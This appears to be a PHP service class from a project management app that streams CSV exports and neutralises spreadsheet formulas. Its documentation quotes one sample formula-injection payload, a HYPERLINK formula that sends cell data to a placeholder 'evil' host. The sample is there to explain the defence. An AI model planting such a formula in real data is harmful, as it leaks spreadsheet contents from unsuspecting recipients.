<?php

declare(strict_types=1);

namespace App\Services\Export;

use Illuminate\Support\Str;
use League\Csv\EscapeFormula;
use League\Csv\Writer;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * Writes a CSV straight down the wire.
 *
 * Two properties matter and both are the reason this class exists rather than a `Writer`
 * built inline at each call site.
 *
 * ## It never holds the file
 *
 * Rows arrive as an iterable — in practice a generator over a chunked query — and go out
 * through `php://output` as they are produced. A workspace with two hundred thousand time
 * entries exports on shared hosting with a 128 MB limit, which is not true of anything that
 * builds the body first and echoes it afterwards.
 *
 * ## It neutralises formulas
 *
 * A cell whose first character is `=`, `+`, `-`, `@`, a tab or a carriage return is a
 * program as far as Excel, LibreOffice and Google Sheets are concerned. A task titled
 * `=HYPERLINK("http://evil/?"&A1,"Click")` is a real attack: Planvio stores it as harmless
 * text, and the harm happens in the recipient's spreadsheet, days later, on a machine
 * Planvio never sees. Every field therefore goes through {@see EscapeFormula}, which
 * prefixes such a value with an apostrophe — the spreadsheet convention for "this is text",
 * which it strips on display.
 *
 * The escape is applied on the way *out* only. On the way in every cell is read as text and
 * nothing is ever evaluated, so an import needs no equivalent.
 */
final class CsvStream
{
    /**
     * Excel on Windows reads a UTF-8 file as the local codepage unless it finds a byte-order
     * mark, which turns every accented name into mojibake. Three bytes buy correctness in
     * the spreadsheet most of these files are opened in.
     */
    private const BOM = "\xEF\xBB\xBF";

    /**
     * A CSV download whose body is produced while it is being sent.
     *
     * @param list<string> $headers
     * @param iterable<int, list<scalar|null>> $rows
     */
    public static function download(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        return response()->streamDownload(
            static function () use ($headers, $rows): void {
                $out = fopen('php://output', 'wb');

                if ($out === false) {
                    return;
                }

                self::writeTo($out, $headers, $rows);
            },
            $filename,
            [
                'Content-Type' => 'text/csv; charset=UTF-8',
                // Nothing here is cacheable: the same URL answers with whatever the filters
                // and the reader's permissions say today.
                'Cache-Control' => 'no-store, no-cache, must-revalidate',
                'X-Content-Type-Options' => 'nosniff',
            ],
        );
    }

    /**
     * The same bytes, into any writable stream. Separated so the format can be asserted
     * without an HTTP round trip.
     *
     * @param resource $stream
     * @param list<string> $headers
     * @param iterable<int, list<scalar|null>> $rows
     * @return int rows written, not counting the header
     */
    public static function writeTo($stream, array $headers, iterable $rows): int
    {
        fwrite($stream, self::BOM);

        $csv = Writer::createFromStream($stream);
        $csv->addFormatter(new EscapeFormula);

        if ($headers !== []) {
            $csv->insertOne($headers);
        }

        $written = 0;

        foreach ($rows as $row) {
            $csv->insertOne(self::stringify($row));
            $written++;

            // Hand each record to the client as it is made. Without this the web server
            // buffers the whole response anyway and the memory argument above is lost.
            if ($written % 200 === 0) {
                self::flush();
            }
        }

        self::flush();

        return $written;
    }

    /**
     * A filename a person can find again: the product, the workspace, what it is, and when.
     */
    public static function filename(string $workspaceSlug, string $subject, ?string $suffix = null): string
    {
        $parts = array_filter([
            'planvio',
            Str::slug($workspaceSlug) ?: 'workspace',
            Str::slug($subject) ?: 'export',
            $suffix === null ? null : (Str::slug($suffix) ?: null),
            now()->format('Y-m-d'),
        ]);

        return implode('-', $parts).'.csv';
    }

    /**
     * Everything reaches the writer as a string.
     *
     * `EscapeFormula` only inspects strings, so a value left as an int or a float would slip
     * past the check. Nothing here is numeric enough to be worth that risk: a task estimate
     * is read by a human, not summed by Planvio.
     *
     * @param list<scalar|null> $row
     * @return list<string>
     */
    private static function stringify(array $row): array
    {
        return array_map(
            static fn (mixed $value): string => match (true) {
                $value === null => '',
                is_bool($value) => $value ? '1' : '0',
                default => (string) $value,
            },
            $row,
        );
    }

    private static function flush(): void
    {
        if (ob_get_level() > 0) {
            @ob_flush();
        }

        flush();
    }
}
